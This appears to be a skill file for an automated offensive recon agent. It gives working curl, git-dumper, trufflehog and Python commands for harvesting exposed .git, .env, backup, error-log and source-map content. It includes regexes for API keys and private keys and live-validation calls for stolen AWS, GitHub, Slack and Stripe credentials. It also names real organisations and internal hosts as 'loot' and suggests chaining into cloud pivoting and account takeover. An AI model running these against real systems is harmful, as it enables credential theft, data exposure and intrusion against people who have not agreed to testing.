---
name: "Secrets & Source Recon"
description: "Harvest exposed secrets and source: .git/.env/backup/config exposure, JS-bundle key mining, exposed VCS/CI metadata, and dork-style discovery. Deterministic live-credential validation as proof."
tags: ["info_disclosure", "misconfig"]
recommended_tools: ["curl", "trufflehog", "gitleaks", "git", "ffuf", "jq", "python3"]
vuln_classes: ["info_disclosure", "misconfig"]
domain: recon
phase: recon
---
# Secrets & Source Recon

Maps to vuln_classes: info_disclosure, misconfig.

## Where to look (exposed files/dirs)
```
/.git/  /.git/config  /.git/HEAD  /.gitignore   # exposed repo -> full source
/.env  /.env.local  /.env.prod  /config.php.bak  /wp-config.php~  /settings.py
backups:  /backup.zip  /db.sql  /dump.sql  /site.tar.gz  /www.zip  /<host>.zip
VCS/CI:   /.svn/  /.hg/  /.DS_Store  /.gitlab-ci.yml  /.github/workflows/*.yml  /Jenkinsfile
meta:     /.well-known/security.txt  /server-status  /actuator/env  /actuator/heapdump
cloud:    /.aws/credentials  /.s3cfg  /credentials.json  /serviceAccount.json
source:   php://filter base64 read (route to file-inclusion-traversal)
```
Probe with ffuf against a curated wordlist; treat 200 + non-empty + correct content-type as a hit.

## Exposed .git -> full source reconstruction
```
curl -s https://target/.git/config       # confirm exposure
git-dumper https://target/.git/ ./loot    # reconstruct working tree
trufflehog filesystem ./loot --only-verified
gitleaks detect --source ./loot --no-git
```

## JS bundle / front-end secret mining
Front-end bundles routinely leak API keys, internal endpoints, and tokens.
```
# gather JS, grep for high-signal patterns
curl -s https://target/ | grep -oE 'src="[^"]+\.js"'
trufflehog filesystem ./js/    # or run regexes below
```
High-signal regexes:
```
AWS:        AKIA[0-9A-Z]{16}                 (+ 40-char secret nearby)
Google API: AIza[0-9A-Za-z_\-]{35}
Slack:      xox[baprs]-[0-9A-Za-z-]{10,}
GitHub PAT: ghp_[0-9A-Za-z]{36}  /  github_pat_[0-9A-Za-z_]{82}
Stripe:     sk_live_[0-9A-Za-z]{24,}
JWT:        eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+
Private key:-----BEGIN (RSA|EC|OPENSSH|PRIVATE) KEY-----
Generic:    (api|secret|access|private)[_-]?(key|token|secret)\"?\s*[:=]\s*\"?[A-Za-z0-9_\-]{16,}
```
Also pull source maps: `<bundle>.js.map` reveals original source + comments.

## Dork-style external discovery
```
GitHub:  org/domain + (password|api_key|secret|BEGIN RSA) ; check commit history & forks (github_dorker pattern)
Wayback: gau / waybackurls target.com -> grep for ?token=, ?key=, /admin, .bak, .env in historical URLs
```

## Deterministic proof signal
A secret is a CONFIRMED finding only when validated live (do NOT just report a regex match):
```
AWS:    aws sts get-caller-identity            # returns Arn/Account => valid
GitHub: curl -s -H "Authorization: token ghp_..." https://api.github.com/user  # 200 + login
Slack:  curl -s https://slack.com/api/auth.test -d token=xox...   # "ok":true
Stripe: curl -s https://api.stripe.com/v1/balance -u sk_live_...:  # 200 balance
JWT:    decode + replay against the issuer's protected endpoint (route to jwt-attacks)
```
For exposed .git/.env/backup: proof is the returned file content containing real credentials/source (e.g. `DB_PASSWORD=`, `-----BEGIN PRIVATE KEY-----`, `root:x:0:0:` style config), AND for credentials, the live-validation above. Strip false positives: placeholder/example/`changeme`/`xxxx` values do not count.

## Chaining
- Leaked cloud key -> enumerate/pivot (prowler/scout-suite).
- Leaked .git source -> static review for SQLi/SSTI sinks (feed exploitation skills).
- Leaked internal endpoint/host -> SSRF/recon expansion.

CWE-200, CWE-538 (file/dir info exposure), CWE-540 (source code exposure), CWE-798 (hardcoded credentials).

## Modern techniques & real-world CVEs (via recon-skills)

### Source-map (.js.map) reconstruction pipeline
Source maps expose the full pre-minification TypeScript/ES6 tree via the `sourcesContent` array — every API route, auth branch, and hardcoded secret becomes readable. Discover maps from `sourceMappingURL` comments (last line of each bundle), `asset-manifest.json`, or Next.js `_buildManifest.js`.
```bash
# Find bundles that ship a source map
for JS in $(curl -s "https://$TARGET/" | grep -oP 'src="[^"]*\.js"' | sed 's/src="//;s/"//'); do
  curl -s "https://$TARGET$JS" | tail -1 | grep -q sourceMappingURL && echo "[+] map: $JS"
done
# Reconstruct original source files from a .map
curl -s "$JS_URL.map" | python3 -c "
import sys, json, os
d = json.load(sys.stdin)
for src, content in zip(d.get('sources', []), d.get('sourcesContent', []) or []):
    if not content: continue
    p = '/tmp/sm/' + src.replace('../','').replace('./','').replace('webpack://','')
    os.makedirs(os.path.dirname(p), exist_ok=True); open(p,'w').write(content)
"
grep -rE 'API_KEY|SECRET|PASSWORD|TOKEN|PRIVATE' /tmp/sm/
grep -rE 'process\.env\.' /tmp/sm/ | grep -vE 'NEXT_PUBLIC_|VITE_'   # non-public env refs
grep -rE 'https?://[^"]*internal|localhost|127\.0\.0\.1|10\.|172\.|192\.168' /tmp/sm/
```
Next.js buildId: `curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+'` then pull `/_next/static/$BUILD_ID/_buildManifest.js`.

#### Faux-map detection (mandatory gate)
Angular/React on nginx serve `index.html` for any unhandled route, so a `.js.map` URL returns HTTP 200 with HTML, not JSON. Check before parsing:
```bash
head -c 80 /tmp/map_file   # "{" or ")]}'" = real map ; "<!DOCTYPE"/"<html" = faux (SPA)
```
Fallback when maps are faux/404: download raw bundles and grep directly — still yields internal API URLs with custom ports (real find: a 3.8MB Angular `main.js` grep surfaced `https://mean.stagingsdei.com:446`, an undocumented MEAN API gateway).
```bash
# Highest-value grep: internal URL with non-standard port
grep -oP '"(https?://[^"]+:\d{3,5}[^"]*)"' /tmp/js_*.js | sort -u
```

### Per-port bundle mining
SPAs often serve the public app on 443 and an admin/API on a separate port (8080/8081/8084) whose bundle carries *different* secrets and its own source map. Probe every discovered port for `/static/js/main.*.js.map` and `/assets/index-*.js.map`. Framework state is also embedded in HTML: `__NEXT_DATA__` (Next.js), `__NUXT__` (Vue/Nuxt) — grep these for props/config.

### Swagger / OpenAPI endpoint discovery
A public spec hands you the entire API surface (paths, params, auth schemes, internal route names) with no crawling.
```bash
for P in /swagger.json /api/swagger.json /v1/swagger.json /v2/swagger.json /v3/swagger.json \
         /openapi.json /api/openapi.json /api-docs /api-docs.json /.well-known/openapi.json \
         /graphql/schema.json; do
  code=$(curl -s -o /tmp/sw -w '%{http_code}' "https://$TARGET$P")
  [ "$code" = 200 ] && echo "[+] $P" && python3 -c "import json;print('\n'.join(json.load(open('/tmp/sw')).get('paths',{})))"
done
```

### GitLab public-API recon (when a gitlab.* host exists)
Self-hosted GitLab with public visibility or open registration exposes the whole dev infra via unauthenticated `/api/v4`. Real loot: CGE-RJ leaked 461K CPF records + internal IP 10.11.82.75 + CI/CD tokens; SMart Fit leaked Firebase service-account keys.
```bash
G="https://gitlab.$TARGET"
curl -s "$G/api/v4/version"                                  # confirm + version -> CVE targeting
curl -s -o /dev/null -w '%{http_code}' "$G/users/sign_up"    # 200 = open registration
curl -s "$G/api/v4/projects?visibility=public&per_page=100" | jq -r '.[]|"\(.id) \(.path_with_namespace)"'
# Pull sensitive files raw (try ref=main then master); %2F-encode the path
curl -s "$G/api/v4/projects/$ID/repository/files/.env/raw?ref=main"
curl -s "$G/api/v4/projects/$ID/repository/files/.gitlab-ci.yml/raw?ref=main"
curl -s "$G/api/v4/projects/$ID/variables"                   # CRITICAL if it returns values (usually admin-only)
curl -s "$G/api/v4/projects/$ID/repository/commits?per_page=20" | jq -r '.[]|"\(.author_email) \(.title)"'
```

### Exposed error_log / debug.log mining
Misconfigured PHP (`display_errors`) leaks server paths, DB creds, SQL schema, API keys, and WP salts. Confirmed: wines.com `error_log` (1.7MB, later 896MB) yielded 879 SQL queries + 47 server paths + WP salts. Logs can be multi-GB — check `Content-Length` first, range-sample with `curl -r 0-5000000`. Also probe rotated names (`error_log.1`, `error_log.old`, `error_log-YYYYMMDD`) and subdirectory logs, not just root.
```bash
for P in error_log wp-content/debug.log debug.log php_errors.log logs/error.log; do
  curl -s -o /dev/null -w "%{http_code} $P\n" "https://$TARGET/$P"; done
# Mine a downloaded log (production regexes)
python3 - <<'PY'
import re
t=open('error_log.txt').read()
print('paths', set(re.findall(r'/home/[^\s:)]+', t)))
for pat in (r"DB_USER[^=]*=[\s'\"]*([^'\";\s]+)", r"DB_PASSWORD[^=]*=[\s'\"]*([^'\";\s]+)"):
    print('db', re.findall(pat, t))
for pat in (r'sk-[a-zA-Z0-9]{20,60}', r'AIza[0-9A-Za-z_-]{35}', r'AKIA[0-9A-Z]{16}'):
    print('key', re.findall(pat, t))
print('sql', re.findall(r'(?:SELECT|INSERT|UPDATE|DELETE|CREATE TABLE)[^;]{0,300}', t, re.I)[:10])
print('salts', re.findall(r'(?:AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|AUTH_SALT|NONCE_SALT)[^,;]+', t))
PY
```
Note: API keys pulled from server-side error logs are almost always *unrestricted production* keys, unlike often-scoped JS-bundle keys.

### False-positive filtering (do this or drown in noise)
- **SPA catch-all**: single-page apps return 200 + index.html for any path — >70% false positives without a content check. Require a per-file content signature (`.env` -> `DB_|APP_|_KEY|_SECRET`; `.git/config` -> `[core]`; `backup.sql` -> `CREATE TABLE|INSERT INTO`; `error_log` -> `PHP|Stack trace`).
- **Parked/for-sale domains**: every path returns 200 with the same landing page. Early-exit if `/robots.txt` and `/.env` return near-identical bodies (same title/hash or "for sale"/"parked").
- **CDN 200-on-error**: CloudFront/S3 return 200 with an XML error body for missing files — check content type + body.

### New provider verification (live-validate before reporting)
```bash
# Firebase Web API key — is it usable for account signup?
curl -s "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIza..."
# Supabase anon key — reachable data plane?
curl -s "https://PROJECT.supabase.co/rest/v1/users?limit=1" -H "apikey: KEY" -H "Authorization: Bearer KEY"
# Mercado Pago APP_USR-... , Auth0 domain/client_id (route to jwt-attacks for token replay)
```
Not secrets (don't report): Vercel deploy IDs `dpl_*`, Supabase anon keys (public by design — the *backend URL* is the intel), `NEXT_PUBLIC_*`/`VITE_*` env vars.

### Chaining additions
- **Source leak -> write gap**: routes/tokens from a source map reveal REST/Supabase/Firebase write endpoints. Test the "read-protected, write-open" pattern — `GET /resource` is RLS-scoped but `PATCH /resource` accepts privileged fields (`tier_id`, `role`, `balance`). A cross-user write (`PATCH /subscribers?user_id=neq.<me>` returning rows) is CRITICAL IDOR-write / account takeover.
- **build-info / info.json git hash** -> pin exact dependency versions -> targeted CVE lookup.

